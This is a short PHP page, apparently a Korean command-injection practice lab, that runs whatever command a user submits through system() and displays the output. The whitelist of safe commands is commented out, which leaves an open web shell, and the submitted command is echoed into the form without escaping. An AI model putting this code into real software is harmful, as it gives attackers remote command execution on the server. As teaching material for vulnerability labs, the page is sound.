<?php
// shell.php

$output = "";
$command = $_POST['command'] ?? "";

$allowCommands = [
    "dir" => "dir",
    "whoami" => "whoami",
    "ipconfig" => "ipconfig",
    "hostname" => "hostname"
];

if ($_SERVER['REQUEST_METHOD'] == "POST") {

    //$cmd = $allowCommands[$command];

    ob_start();
    system($_POST["command"] . " 2>&1");
    $output = ob_get_clean();

    // Windows CP949 출력 한글 깨짐 방지
    $output = mb_convert_encoding($output, "UTF-8", "CP949, UTF-8");

    $print = $_POST["command"];
}else
{
    $print = "";
}
?>

<h3>Command 실행 실습</h3>

<form method="post">
    <div class="mb-3">
        <label class="form-label">Command</label>
        <input type="text" name="command" class="form-control" placeholder="명령을 입력하세요." value="<?php echo $print?>" >
    </div>

    <button type="submit" class="btn btn-danger">
        실행
    </button>
</form>

<hr>

<h5>실행 결과</h5>

<pre class="border bg-light p-3"><?php
echo htmlspecialchars($output, ENT_QUOTES, "UTF-8");
?></pre>